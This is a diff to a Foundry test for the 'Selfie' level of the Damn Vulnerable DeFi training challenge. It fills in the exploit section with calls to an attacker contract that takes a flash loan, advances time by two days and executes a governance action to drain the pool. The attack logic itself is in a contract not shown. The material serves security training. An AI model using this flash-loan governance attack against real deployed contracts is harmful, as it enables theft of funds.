@@ -7,6 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
+import {Selfish} from "./Selfish.sol";
 
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
@@ -44,13 +45,16 @@ contract Selfie is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+        Selfish selfish = new Selfish(
+            address(attacker),
+            address(dvtSnapshot),
+            address(selfiePool),
+            address(simpleGovernance)
+        );
+        selfish.getFlashloan();
+        vm.warp(block.timestamp + 2 days); // 5 days
+        selfish.executeAction();
 
-        /**
-         * EXPLOIT END *
-         */
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
